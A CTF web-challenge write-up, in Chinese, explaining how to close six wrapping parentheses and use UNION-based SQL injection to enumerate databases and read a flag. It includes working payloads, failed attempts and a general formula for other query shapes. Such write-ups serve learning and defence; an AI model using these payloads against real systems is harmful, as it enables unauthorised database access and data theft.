---
title: "括号包裹型 SQL 注入」 题解"
date: 2026-11-08
pinned: false
description: "括号包裹型 SQL 注入 · HackBar 实战与原理问答"
tags: [ctf, web, WriteUp]
categories: [web]
draft: false
cover: /hero/bg-09-gork.jpg
---

# 括号包裹型 SQL 注入 · HackBar 实战与原理问答

| 项目   | 内容                                                 |
| ---- | -------------------------------------------------- |
| 靶场   | `http://node5.anna.nssnode.cn:20645/`（狠狠的注入涅~）     |
| 题型   | Web / SQL 注入（数字型 + 括号包裹 + UNION 回显）                |
| 入口参数 | GET `id`                                           |
| 技术栈  | PHP 7.3.22 + MariaDB 10.4.13                       |
| 工具   | 浏览器 DevTools 内置 **HackBar**（LOAD / EXECUTE / SQLi） |
| 数据库  | 库 `ctf`（诱饵）、库 `ctftraining`（真 flag）                |
| 结果   | `NSSCTF{1a3854f1-7404-4424-b022-639eeb365cb4}`     |

> 靶场为平台临时实例，做完会失效，复现请换自己的实例地址。

---

## 一、源码：为什么这题和学过的注入不一样

题目直接把源码贴在页面上：

```php
$sql = "SELECT username,password FROM users WHERE id = ".'(((((('.$_GET["id"].'))))))';
$result = $conn->query($sql);
```

拼接结果永远是这个形状：

```
SELECT username,password FROM users WHERE id = (((((( 【你的输入】 ))))))
                                                └─6个左括号─┘        └─6个右括号─┘
```

### 1.1 和经典题的三点差异

| 对比项    | 经典教学题            | 本题                        |
| ------ | ---------------- | ------------------------- |
| 注入点类型  | 字符型 `id='$id'`   | **数字型**                   |
| 需要闭合什么 | 单引号 `'`          | **6 个左括号**                |
| 拼接后形态  | `WHERE id = '1'` | `WHERE id = ((((((1)))))` |

### 1.2 最容易误解的一点：那对单引号不是 SQL 的引号

```php
"... WHERE id = " . '((((((' . $_GET["id"] . '))))))'
                    ↑ 单引号是 PHP 字符串的定界符（PHP 语法）
```

SQL 语句里根本**没有单引号**，所以 `id=1' or 1=1--+` 这种打法在这里永远不可能成功。这是“为什么和我学过的不一样”的根本原因。

### 1.3 一个额外福利：页面自带回显调试

页面右侧会把**实际执行的 SQL** 和 `print_r` 后的结果都打印出来：

```
Executed Operations:
SELECT username,password FROM users WHERE id = ((((((1))))))
→ Array ( [0] => Array ( [username] => tanji [password] => OHHHHHHH ) )
```

相当于自带一个编译器——**括号配平不对、关键字粘连，一眼就能看出来**，比黑盒盲猜强太多。本文所有实验都靠它验证。

---

## 二、通关链路（4 步）

| 步 | 目的                 | HackBar 里粘贴的 URL                                                                                                          | 回显                                                                 |
| - | ------------------ | ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| 1 | 确认回显               | `?id=1`                                                                                                                   | `tanji / OHHHHHHH`                                                 |
| 2 | 列库名                | `?id=0)))))) union select group_concat(schema_name),2 from information_schema.schemata-- -`                               | `information_schema,mysql,ctftraining,performance_schema,test,ctf` |
| 3 | 列 `ctftraining` 的表 | `?id=0)))))) union select group_concat(table_name),2 from information_schema.tables where table_schema='ctftraining'-- -` | `flag,news,users`                                                  |
| 4 | 直接读数据              | `?id=0)))))) union select 1,flag from ctftraining.flag-- -`                                                               | `NSSCTF{1a3854f1-7404-4424-b022-639eeb365cb4}`                     |

> 第 4 步没写 `group_concat` 是对的：`flag` 表只有一列、只有一行，不需要拼接。`group_concat` 是“多行合成一行”时才用。
>
> 以上是整理后的标准写法（`id=0` + 位置 1）。**实际动手时的原始记录（含两次失败）见第三章**，两版结果等价。



---

## 三、我的操作记录（原始回放 + 两次翻车复盘）

> 下面是实际动手的全过程，**包括两次失败**。失败部分比成功部分更有价值——它解释了"工具明明会用，为什么结果还是 0 results"。

### 3.1 第一次尝试：连点 SQLi 模板，越点越乱

**HackBar URL 框里的内容（解码后）**：

```
?id=1))))))))))) +union select group_concat(schema_name),2 from information_schema.schemata
union select 1,group_concat(schema_name) from information_schema.schemata
union select 1,group_concat(schema_name) from information_schema.schemata)))
```

**服务器实际执行（页面 Executed Operations 原样打印）**：

```
SELECT username,password FROM users WHERE id = ((((((1))))))-+union select group_concat(schema_name),2
from information_schema.schemataunion select 1,group_concat(schema_name) from information_schema.schemata)))
```

**结果**：`0 results`

| 症状 | 根因 |
|---|---|
| `)` 有 11 个 | 连点 SQLi 模板，括号层层叠加（应为 6 个） |
| `union select` 出现 3 次 | SQLi 按钮是"**插入**"不是"替换" |
| `schemataunion` 粘在一起 | 模板插入时没带空格，关键字变成标识符 |
| 冒出一个 `-+` | URL 里混进多余减号；`+` 在 URL 里就是空格 |
| 结尾没有注释符 | 源码补的 6 个 `)` 赤裸裸留在末尾 |

### 3.2 第二次尝试：弹窗填了 2 2，还是 0 results

按提示点开 SQLi 弹窗，认真填了「列数 2、输出位置 2」——结果依旧 `0 results`。

原因：**弹窗只负责插入模板，不负责清理现场**。URL 框里那三段重复的 `union select` 还在，它只是在后面又接了一段，脏上加脏。

> 这一步是整道题的分水岭：**先清空（`Ctrl+A` → `Delete`），再操作。**

### 3.3 成功路径：4 步

清空 URL 框后，双击列表、逐条粘贴、EXECUTE：

| 步 | HackBar 里粘贴的原文 | 回显 |
|---|---|---|
| 1 | `http://node5.anna.nssnode.cn:20645/?id=1)))))) union select 1,group_concat(schema_name) from information_schema.schemata --+-` | `[1] username=1 / password=information_schema,mysql,ctftraining,performance_schema,test,ctf` |
| 2 | `...?id=1)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining' --+-` | `flag,news,users` |
| 3 | `...?id=1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema='ctftraining' --+-` | `flag,id,title,content,time,id,username,password,ip,time` |
| 4 | `...?id=1)))))) union select 1,flag from ctftraining.flag --+-` | `NSSCTF{1a3854f1-7404-4424-b022-639eeb365cb4}` |

**第 1 步的实际回显**（注意多了一行原数据）：

```
Array (
    [0] => Array ( [username] => tanji      [password] => OHHHHHHH )
    [1] => Array ( [username] => 1          [password] => information_schema,mysql,ctftraining,performance_schema,test,ctf )
)
```

`[0]` 是 `id=1` 查出来的原始用户，`[1]` 才是我们 union 出来的结果。

### 3.4 两次失败 vs 最终成功，差在哪

| 对比项 | 失败版本 | 成功版本 |
|---|---|---|
| 右括号数量 | 11 个（或混乱） | **6 个** |
| union 段数 | 3 段 | **1 段** |
| 关键字空格 | `schemataunion`（粘连） | `schemata union` / `schemata --+-` |
| 结尾注释 | 无 | **`--+-`**（等价 `-- -`） |
| 多余字符 | 有 `-+` | 无 |
| 结果 | 0 results | 有回显 |

### 3.5 与本文档标准写法的差异（三种写法都对）

| 位置 | 我的写法 | 文档写法 | 是否影响结果 |
|---|---|---|---|
| id 值 | `id=1` | `id=0` | 不影响；用 1 会多带出 tanji 一行 |
| 函数位置 | `select 1,函数`（位置 2） | `select 函数,2`（位置 1） | 不影响；数据分别显示在 password / username 栏 |
| 注释符 | `--+-` | `-- -` | 完全等价，`+` 就是空格 |

**推荐**：`id=0` + 位置 1，回显最干净（少一行原数据，结果排在第一栏）。

### 3.6 复盘：真正卡住我的三件事

| # | 当时的困惑 | 真相 |
|---|---|---|
| 1 | `))))))` 到底是什么 | 以为是某种固定格式/占位符，实际是"还清源码里 6 个左括号的债" |
| 2 | `-- -` 到底是什么 | 以为是分隔符，实际是注释，用来吃掉源码尾部的 6 个右括号 |
| 3 | 工具会用，为什么还是 0 results | HackBar 是纯文本框，不纠错、不清空；脏 payload 发出去就是语法错误 |

**一句话**：失败不是因为不会用 HackBar，而是因为**把"插入式"的模板当成了"生成式"的修复**——它在脏数据上加东西，永远不会变干净。

---

## 四、HackBar 操作详解（不用 Burp）

### 3.1 打开与准备

| 步 | 操作                                         |
| - | ------------------------------------------ |
| 1 | 浏览器打开靶场首页                                  |
| 2 | `F12` → 顶部标签切到 **HackBar**                 |
| 3 | 点 **LOAD**，把当前页面完整 URL 灌进 `URL` 文本框        |
| 4 | 在 URL 框**末尾追加** payload（这框要填完整 URL，不是只填参数） |
| 5 | 点 **EXECUTE**，看下方响应                        |

### 3.2 最重要的一件事：URL 框是“追加式”的

这是整场最容易翻车的地方。**HackBar 不会帮你清空、不会帮你补空格、不会帮你配平括号**，它就是个纯文本框。

实际踩过的坑（原始 URL 解码后）：

```
?id=1))))))))))) +union select ... schemataunion select ... schemataunion select ...schemata
```

| 症状                  | 后果                 |
| ------------------- | ------------------ |
| `)` 有 11 个（应 6 个）   | 括号不配平              |
| `union` 出现 3 次      | 语法重复               |
| `schemataunion` 没空格 | 关键字粘连成标识符          |
| 结尾没有 `-- -`         | 残余 `))))))` 直接报语法错 |

页面只显示 `0 results`，不显示 SQL 错误 → 看起来像“HackBar 坏了”，其实是 payload 本身是废的。

**正确姿势**：粘贴新 payload 前，**点进 URL 框 → `Ctrl+A` → `Delete`**，确认框变空白再粘贴。

### 3.3 `--+-` 是什么

HackBar 会把空格显示/传输成 `+`，所以 URL 里的

```
... schemata--+-
```

解码后就是

```
... schemata-- -
```

也就是“`--` + 空格 + `-`”，正好是合法的 MySQL 注释。看到 `+` 不用慌，那就是空格。

---

## 五、原理拆解①：`))))))` 到底在干什么

### 4.1 一句话

**SQL 里的括号必须成对。源码开了 6 个左括号，你的输入处就得还 6 个右括号。**

### 4.2 实测：只改括号数量，其余完全一样

| 输入         | 服务器实际执行的 SQL                                         | 结果          |
| ---------- | ---------------------------------------------------- | ----------- |
| `0)))`     | `... id = ((((((0))) union select 1,2-- -))))))`     | ❌ 0 results |
| `0)))))`   | `... id = ((((((0))))) union select 1,2-- -))))))`   | ❌ 0 results |
| `0))))))`  | `... id = ((((((0)))))) union select 1,2-- -))))))`  | ✅ `1 / 2`   |
| `0)))))))` | `... id = ((((((0))))))) union select 1,2-- -))))))` | ❌ 0 results |

### 4.3 为什么少一个、多一个都炸

**少（3 个）**：`((((((0))) union` —— 开了 6 个只关 3 个，**还剩 3 个没闭合**。解析器此时仍在“括号表达式内部”，突然遇到 `union`，语法错误。

**多（7 个）**：`((((((0))))))) union` —— 6 开 7 关，**多出 1 个孤儿右括号**，没人认领，同样报错。

**正好（6 个）**：`((((((0))))))` —— 6 开 6 关，表达式闭合干净，后面的 `union` 才能作为合法的第二个查询。

### 4.4 括号在 SQL 里是什么

就是数学里的分组符号 `((1+2)*3)`。它是**表达式的一部分**，必须严格配对，不像引号那样可以“提前结束”。

**通用公式**：

```
不存在的值 + 补齐源码里没闭合的符号 + 注入语句 + 注释掉剩余部分
```

| 源码拼法                       | 你的 payload                     | 你要做的事     |
| -------------------------- | ------------------------------ | --------- |
| `"WHERE id = '$id'"`       | `0' union select 1,2-- -`      | 闭合 1 个引号  |
| `"WHERE id = ($id)"`       | `0) union select 1,2-- -`      | 闭合 1 个括号  |
| `"WHERE id = (((($id))))"` | `0)))) union select 1,2-- -`   | 数出 4 个左括号 |
| 本题                         | `0)))))) union select 1,2-- -` | 数出 6 个左括号 |

**括号数是数出来的，不是背出来的。** 源码给了就直接数，没给就靠 `order by` / 逐步试。

---

## 六、原理拆解②：`-- -` 到底在干什么

### 5.1 MySQL 的注释语法

```sql
-- 注释，到行尾（-- 后必须跟空白字符）
#  注释，到行尾
/* 块注释 */
```

`--` 后面**必须有一个空白**（空格/Tab/换行）才算注释。原因：`--` 本身也是“连续两个减号”的运算（`1--2` = `1-(-2)` = 3），MySQL 用“后跟空白”来区分注释与减号。

### 5.2 为什么写成 `-- -` 而不是 `--`

```
-- -))))))
↑  ↑ ↑
│  │ └── 注释内容（那些多余的右括号）
│  └──── 必须的空格
└─────── 注释符
```

末尾多一个 `-` 的两个作用：

| 作用 | 说明                                       |
| -- | ---------------------------------------- |
| 托底 | URL 末尾空格容易被 trim/丢失，加个字符保证“`--` 后面确实有空白” |
| 无害 | 注释内容 MySQL 完全不解析                         |

### 5.3 为什么“必须”注释尾部

源码在输入后面还补了 6 个右括号：

```php
'(((((( '.$_GET["id"].'))))))'
  6 左            6 右
```

不注释时，它们落在 `union select 1,2` 后面：

```
union select 1,2))))))    ← 6 个右括号前面没有左括号 → 报错
```

注释后：

```
union select 1,2-- -))))))  ← 被注释吃掉，MySQL 不看
```

**实测对照**：

| 结尾     | 最终 SQL 尾部                    | 结果          |
| ------ | ---------------------------- | ----------- |
| `-- -` | `union select 1,2-- -))))))` | ✅ 正常        |
| 无      | `union select 1,2))))))`     | ❌ 0 results |

### 5.4 `#` 是等价替代，但在 URL 里必须编码

```sql
union select 1,2#          ← 等价，且不需要空格
```

但 `#` 在 URL 里是锚点，**后面内容不会被发给服务器**，必须写 `%23`：

```
?id=0))))))%20union%20select%201,2%23        ✅
?id=0))))))%20union%20select%201,2--%20-     ✅
```

---

## 七、数据库、表、列、行（概念补齐）

### 6.1 层级关系

```
MySQL 服务器
└── 数据库 database / schema      ← 相当于一个 Excel 文件
    └── 表 table                  ← 相当于一个工作表 sheet
        ├── 列 column / 字段       ← 相当于表头那一行
        └── 行 row / 记录          ← 表头下面的每条数据
```

| 概念  | 英文                | Excel 类比      | 本题实例                           |
| --- | ----------------- | ------------- | ------------------------------ |
| 数据库 | database / schema | 一个 `.xlsx` 文件 | `ctftraining`                  |
| 表   | table             | 工作表 sheet     | `flag`、`news`、`users`          |
| 列   | column            | 表头            | `flag`、`id`、`title`、`username` |
| 行   | row               | 一条记录          | `NSSCTF{1a38…}` 那一行            |
| 单元格 | cell              | 行列交叉点         | flag 本身                        |

### 6.2 为什么要绕去 `information_schema`

你不知道目标库里有什么，就像拿到陌生 Excel 不知道有几个 sheet。MySQL 把这些“目录信息”存在自带的 `information_schema` 库里，查它等于看目录。

| 字典表                           | 记录什么       | 关键字段                                          |
| ----------------------------- | ---------- | --------------------------------------------- |
| `information_schema.schemata` | 所有**数据库**名 | `schema_name`                                 |
| `information_schema.tables`   | 所有**表**名   | `table_schema` + `table_name`                 |
| `information_schema.columns`  | 所有**列**名   | `table_schema` + `table_name` + `column_name` |

### 6.3 四步分别是哪一层

| 步 | SQL                                                                                   | 问的问题        | 拿到                                    |
| - | ------------------------------------------------------------------------------------- | ----------- | ------------------------------------- |
| 1 | `select schema_name from information_schema.schemata`                                 | 有哪些**库**    | `ctftraining, ctf, mysql, test…`      |
| 2 | `select table_name from information_schema.tables where table_schema='ctftraining'`   | 这库有哪些**表**  | `flag, news, users`                   |
| 3 | `select column_name from information_schema.columns where table_schema='ctftraining'` | 这些表有哪些**列** | `flag, id, title, content, username…` |
| 4 | `select flag from ctftraining.flag`                                                   | 直接读**数据**   | flag                                  |

**可改进点**：第 3 步只过滤了 `table_schema`，三张表的列全混在一起。加 `and table_name='flag'` 就只出 flag 表自己的列：

```sql
select group_concat(column_name) from information_schema.columns
where table_schema='ctftraining' and table_name='flag'
```

### 6.4 `group_concat` 什么时候需要

| 情况                | 写法                                                    |
| ----------------- | ----------------------------------------------------- |
| 多行要一次看全（如表名有 3 条） | `group_concat(table_name)`                            |
| 只有一行数据（如 flag 表）  | 直接 `select flag` 即可                                   |
| 多个字段拼一起看          | `group_concat(username,0x7c,password)`（`0x7c` 是 `\|`） |

---

## 八、`print_r` 回显怎么读（`=>` 是什么）

页面把结果丢给了 `print_r()`，所以输出长这样：

```
Array (
    [0] => Array (
        [username] => tanji
        [password] => OHHHHHHH
    )
    [1] => Array (
        [username] => 1
        [password] => NSSCTF{1a3854f1-7404-4424-b022-639eeb365cb4}
    )
)
```

`=>` 是 PHP 打印数组的固定格式：**左边是键，右边是值**，跟数学运算无关。

| 看到的                   | 意思                       |
| --------------------- | ------------------------ |
| `Array (`             | 数组开始                     |
| `[0] =>`              | 第 0 条记录（下标从 0 开始）        |
| `[username] => tanji` | 列 `username` 的值是 `tanji` |
| `[1] =>`              | 第 1 条记录                  |

**两个常见误解**：

| 误解                    | 真相                                          |
| --------------------- | ------------------------------------------- |
| `=>` 是“大于等于”          | ❌ 是键值映射，等价于 JSON 的 `"username": "tanji"`    |
| 有 2 个 `Array` 说明列数是 2 | ❌ 那是**行数**。用 `id=0` 就只剩 1 个 `Array`，但列数仍是 2 |

**为什么第 1 行 `username` 是 `1`**：因为你写的是 `union select 1,flag`，第 1 列放的是字面量 `1`，它占的就是 `username` 位置。这也正好说明“输出位置”决定数据落在哪一栏。

---

## 九、弹窗里的两个数字（HackBar 的 SQL injection）

点 HackBar 的 **SQLi** 按钮会弹出：

```
The number of columns  [ 2 ]    Output position [ 2 ]
"The number of columns must be larger than or equal to output position."
```

### 8.1 两个字段分别是什么

| 字段                    | 含义             | 由什么决定                               | 能否修改       |
| --------------------- | -------------- | ----------------------------------- | ---------- |
| The number of columns | **原查询有几列**     | 源码 `SELECT username,password` = 2 列 | ❌ 不能，改了报错  |
| Output position       | **你的函数放第几个槽位** | 你自己选                                | ✅ 1 或 2 都行 |

### 8.2 第一个 2：为什么只能是 2

`UNION` 的硬性规则——**上下两个查询列数必须完全相等**。实测：

| union 写法             | 结果          | 原因        |
| -------------------- | ----------- | --------- |
| `union select 1,2`   | ✅ 1 / 2     | 2 列，对齐    |
| `union select 1,2,3` | ❌ 0 results | 3 列 ≠ 2 列 |
| `union select 1`     | ❌ 0 results | 1 列 ≠ 2 列 |

### 8.3 第二个 2：只是“放哪一栏”

| 输出位置 | 生成的 payload                        | 回显位置               |
| ---- | ---------------------------------- | ------------------ |
| 1    | `union select group_concat(...),2` | `[username] => 数据` |
| 2    | `union select 1,group_concat(...)` | `[password] => 数据` |

**实测对比（同一段数据）**：

```
位置1 → [username] => information_schema,mysql,ctftraining,...   [password] => 2
位置2 → [username] => 1                                          [password] => information_schema,mysql,...
```

数据完全一样，只是显示栏不同。本题两列都会打印，所以选 1 或 2 都可以。

### 8.4 那这个选项存在的意义

因为**不是所有题都打印全部列**。很多题只 echo 一列：

```php
echo "欢迎你，" . $row['username'];   // password 不显示
```

| 场景              | 位置 1  | 位置 2  |
| --------------- | ----- | ----- |
| 本题（两列都打印）       | ✅ 能看  | ✅ 能看  |
| 只 echo username | ✅ 能看  | ❌ 看不见 |
| 只 echo password | ❌ 看不见 | ✅ 能看  |

**标准做法**：先 `union select 1,2` 放探针，看页面上哪几个数字出现 → 出现的位置才是能回显的位置 → 再把函数放进那个位置。

### 8.5 澄清三个误解

| 误解                 | 真相                                                    |
| ------------------ | ----------------------------------------------------- |
| 两个 2 要“相加等于 4”     | ❌ 是两个独立输入框，不是算式。约束只有「位置 ≤ 列数」                         |
| 第一个 2 是“一共有 2 个数组” | ❌ 那是行数。列数是横向字段数，本题因为 `SELECT username,password` 才等于 2 |
| 必须固定填 2 2          | ❌ 本题列数写死为 2，位置选 2 也合法，所以“不用改”；换 3 列的题就得填 `3 1`        |

**“3 1” 的正确含义**：列数 3、输出位置 1，两个独立数字。例如源码是 `SELECT id,username,password` 时：

```sql
union select group_concat(flag),2,3
--          ↑位置1            ↑位置2 ↑位置3
```

---

## 十、HackBar 的 SQLi 按钮到底是什么

### 9.1 它是“模板插入器”，不是“爆破器”

| 能力                                            | 有没有  |
| --------------------------------------------- | ---- |
| SQL payload 模板速查（union / 报错 / 盲注 / 注释 / 空格替换） | ✅ 有  |
| 按列数自动生成 union 骨架                              | ✅ 有  |
| 自动判列数                                         | ❌ 没有 |
| 跑字典爆破                                         | ❌ 没有 |
| 自动拖库                                          | ❌ 没有 |

要“爆破”得用 Burp Intruder 或 sqlmap；HackBar 只是把小抄摆在你面前。

### 9.2 关键行为：插入 ≠ 替换

点 OK 后，它往**光标处插入**模板，不会覆盖已有内容。所以：

- 连点三次 OK → 得到三段重复的 `union select`
- 在脏 URL 上继续点 → 越点越乱


**这就是“为什么我在 HackBar 上不行”的真正原因**：不是工具问题，是 URL 框里残留的旧 payload 一直在被叠加。

### 9.3 正确使用流程

| 步 | 操作                                                |
| - | ------------------------------------------------- |
| 1 | `Ctrl+A` → `Delete` 清空 URL 框                      |
| 2 | 手输前半段：`http://目标/?id=0))))))`                     |
| 3 | 点 SQLi → 填列数 `2`、位置 `1` → OK                      |
| 4 | 它会插入 `union select 1,2-- -`                       |
| 5 | 手动把位置 1 的 `1` 改成 `group_concat(...)` 并补 `from 表名` |
| 6 | EXECUTE，读 Executed Operations 那行验错                |

---

## 十一、踩坑清单

| # | 坑                        | 说明                                                                                      | 处理                             |
| - | ------------------------ | --------------------------------------------------------------------------------------- | ------------------------------ |
| 1 | 假 flag                   | `ctf.users` 第 2 行 `fake_flag / F1rst_to_Th3_eggggggggg!} (4/4)`，`(4/4)` 是钩子，诱导你去找另外 3 段 | 见 `fake` 字样先怀疑，继续翻别的库          |
| 2 | 真 flag 位置                | 在 `ctftraining.flag` 表，`ctf` 库只是诱饵                                                      | 用 `schemata` 把所有库列出来           |
| 3 | `load_file('/flag')` 返回空 | 数据库用户没有 `FILE` 权限                                                                       | 别在这上面耗时间，回到纯 SQL 路线            |
| 4 | URL 框追加式输入               | 旧 payload 不清空会叠加                                                                        | `Ctrl+A` → `Delete`            |
| 5 | 关键字粘连                    | `schemataunion select` 少个空格                                                             | 模板插入后检查空格                      |
| 6 | `#` 丢了                   | URL 里 `#` 是锚点                                                                           | 用 `%23` 或 `-- -`               |
| 7 | 页面 0 results 无报错         | 出题人没开 `display_errors`                                                                  | 只能靠 Executed Operations 那行肉眼验错 |
| 8 | `id=1` 导致多一行             | 原数据 + union 数据一起显示                                                                      | 用 `id=0` 让原查询为空，回显更干净          |

---

## 十二、总结表

| #  | 环节   | 本题做法                                        | 通用方法论                              |
| -- | ---- | ------------------------------------------- | ---------------------------------- |
| 1  | 看源码  | 页面直接贴出 `'(((((( '.$id.'))))))'`             | 先判断：字符型还是数字型？被什么符号包住？              |
| 2  | 识别陷阱 | 单引号是 PHP 定界符，不是 SQL 引号                      | 引号打法无效时，数括号                        |
| 3  | 闭合   | 补 6 个 `)`                                   | 源码里有几个左括号就补几个右括号                   |
| 4  | 截断尾部 | `-- -` 或 `%23`                              | 源码残留的符号必须注释掉                       |
| 5  | 定列数  | `union select 1,2`                          | 与原查询 SELECT 字段数严格相等                |
| 6  | 探回显位 | 看 1/2 哪个出现                                  | 只打印一列的题，位置选错就白忙                    |
| 7  | 列库   | `information_schema.schemata`               | 字典库三件套：schemata → tables → columns |
| 8  | 列表   | `tables where table_schema='库'`             | 一层层往下问                             |
| 9  | 列列   | `columns where table_schema and table_name` | 两个条件都加，输出才干净                       |
| 10 | 取数据  | `select flag from ctftraining.flag`         | 单行单列不必 `group_concat`              |
| 11 | 验错   | 读 Executed Operations                       | 页面有 SQL 回显时，用它当编译器                 |
| 12 | 工具   | HackBar：清空 → 粘贴 → EXECUTE                   | SQLi 按钮是插入式模板器，不是爆破器               |

**一句话收束**：这道题的 payload 不是背出来的，是&#x4ECE;**“源码开了几个括号”**&#x6570;出来的——前面补齐、后面注释。真正需要记住的只有两条规则：**UNION 列数必须对齐**，**位置决定数据能不能被看见**。
